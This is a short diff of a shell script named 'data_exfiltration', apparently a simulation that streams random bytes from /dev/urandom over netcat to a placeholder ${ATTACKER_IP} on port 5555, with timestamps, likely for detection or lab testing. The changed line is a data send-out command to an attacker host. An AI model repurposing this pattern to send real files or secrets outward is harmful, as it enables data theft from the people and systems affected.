@@ -15,7 +15,7 @@ echo "=== data_exfiltration ($INTENSITY) ==="
 echo "target=${ATTACKER_IP}:5555 size=${SIZE_MB}MB"
 echo "start_ts=$(date -Iseconds)"
 
-head -c "${SIZE_MB}M" /dev/urandom | nc "$ATTACKER_IP" 5555
+head -c "${SIZE_MB}M" /dev/urandom | nc -q 1 "$ATTACKER_IP" 5555
 
 echo "end_ts=$(date -Iseconds)"
 echo "=== data_exfiltration complete ==="
